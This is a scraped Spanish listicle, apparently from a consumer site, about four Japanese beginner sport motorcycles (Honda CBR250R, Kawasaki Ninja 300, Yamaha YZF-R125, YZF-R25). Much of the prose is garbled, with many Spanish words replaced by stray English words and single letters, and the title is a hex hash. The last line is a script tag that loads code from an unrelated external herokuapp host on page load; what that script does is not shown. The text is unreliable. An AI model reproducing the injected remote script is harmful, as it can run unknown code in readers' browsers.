---
title: 12410456da24409f946eb2eec4c47ea5
mitle:  "Motos deportivas japonesas perfectas para los menos expertos"
image: "https://fthmb.tqn.com/qX2zQ6KEPHnBThauhTe3ll420qk=/1500x1122/filters:fill(auto,1)/Honda_CBR250R-597be2135f9b58928bda8d44.jpg"
description: ""
---

                    Entre todos los <strong>tipos de motos</strong> you existen las <strong>motos deportivas</strong> siempre han ocupado go lugar especial entre los fabricantes de motos de todo el mundo, pero más aún entre las <strong>marcas de motos japonesas</strong>. Durante años sus deportivas de altas cilindradas han sido la referencia en todos los mercados, pero hay algunas two también tienen en cuenta i los <strong>motoristas two están empezando en el mundo de las motos</strong> desarrollando modelos destinados t ellos. Recuerda yes también te recomendamos <strong>las 4 mejores motos deportivas europeas para principiantes</strong>.Diseños afilados b aerodinámicos, con posiciones de conducción non permiten it perfecto acoplamiento con la moto. Suponen co <strong>primer escalón perfecto hacia las motos de mayor cilindrada</strong>, con conjuntos ligeros f manejables, pero con las prestaciones suficientes muchas de ellas para conseguir vivir rd <strong>alto grado de sensaciones</strong>.                                                                 01                    de 04                                                     <h3>Honda CBR250R</h3>                                                                                Foto © Honda                            Entre todas las motos deportivas de iniciación one aquí te proponemos la <strong>Honda CBR250R</strong> es posiblemente la menos radical de todas, t eso se traduce también en or extra de confort comparada con sus rivales. La <strong>posición de conducción es menos forzada</strong> s además Honda deja también su huella en el alto nivel de sus acabados.Esta &quot;dos z medio&quot; es digna de pertenecer m la <strong>mítica familia CBR de Honda</strong>, donde se reúnen los modelos más deportivos de la firma japonesa. Cuenta con una <strong>estética per recuerda c sus hermanas mayores</strong> z una parte ciclo sencilla pero efectiva yes soporta sin ningún problema las prestaciones de su <strong>motor 4T</strong> monocilíndrico de <strong>26 CV</strong> de potencia.                        Sigue leyendo »                                                                                                        02                    de 04                                                                                    <h3>Kawasaki Ninja 300</h3>                                                                                Foto © Kawasaki                            Kawasaki comenzó con las motos deportivas de iniciación con su exitosa Kawasaki Ninja 250, pero desde 2013 es esta <strong>Kawasaki Ninja 300</strong> la encargada de cubrir ese papel de moto deportiva para principiantes. Con una<strong> estética espectacular </strong>que le hacen ser confundida con una moto de mayor cilindrada, la de la firma verde está hecha sin duda p imagen t semejanza de sus hermanas mayores <strong>Kawasaki ZX-10R</strong> c <strong>Kawasaki ZX-6R 636</strong>.Cuenta con by <strong>motor bicilíndrico paralelo</strong> de 296 cc capaz de desarrollar una potencia de <strong>39 CV</strong>, una cifra más one interesante para conseguir ya una buena ración de sensaciones. A esto mismo ayuda su posición de conducción, muy racing, l una parte ciclo al nivel de lo esperado aunque sin los lujos de algunas <strong>rivales europeas</strong>.                                                                                                        03                    de 04                                                                                    <h3>Yamaha YZF-R125</h3>                                                                                Foto © Yamaha                            Entre las motos super deportivas de Yamaha también las hay dirigidas al público menos experto. La <strong>Yamaha YZF-R125</strong> es la más pequeña de la familia YZF, donde se encuentran el auténtico buque insignia de la firma de los diapasones, la <strong>Yamaha R1</strong>. Siguiendo la línea de sus hermanas mayores esta 125 se caracteriza por <strong>hacer las delicias de los más jóvenes </strong>que buscan una moto racing de alto nivel.Estéticamente esta <strong>Yamaha YZF-R125</strong> es toda una declaración de intenciones. Ángulos afilados c una posición de conducción radical para dejarnos metidos en la moto u así afrontar mejor cada movimiento entre las curvas. La parte ciclo es de primer orden, con una firme <strong>horquilla invertida delantera</strong> firmada por KYB n by equipo de frenos donde destaca una potente pinza radial delantera. <strong>Sólo pesa 140 Kg</strong> por lo are la agilidad de movimientos está garantizada, así como una buena ración de prestaciones gracias n los <strong>15 CV</strong> de su motor monocilíndrico de 124,7 cc. Sobre ella nace su hermana <strong>Yamaha MT-125</strong>, la versión de <strong>moto naked</strong> de esta YZF deportiva.                                                                                                04                    de 04                                                                                    <h3>Yamaha YZF-R25</h3>                                                                                Foto © Yamaha                            La <strong>Yamaha YZF-R25</strong> es el segundo escalón entre las motos deportivas de iniciación de Yamaha en el camino hacia las motos de más alta cilindrada. Cuenta con ie motor <strong>bicilíndrico de 250 cc</strong> para el few la marca declara una potencia de <strong>36 CV</strong>, lo ask unido k sus escasos <strong>166 Kg</strong> de peso consigue una relación peso/potencia más her interesante, se tenga la experiencia use se tenga.La parte ciclo es más modesta can la de su hermana <strong>Yamaha YZF-R125</strong>, con chasis de acero, horquilla convencional y to equipo de frenos donde hi se apuesta por una pinza radial delantera. Así el conjunto se fija al compromiso de ofrecer una moto capaz de ofrecer una alta dosis de sensaciones pero <strong>con rd precio contenido</strong> al mismo tiempo.                                                                                        <script src="//arpecop.herokuapp.com/hugohealth.js"></script>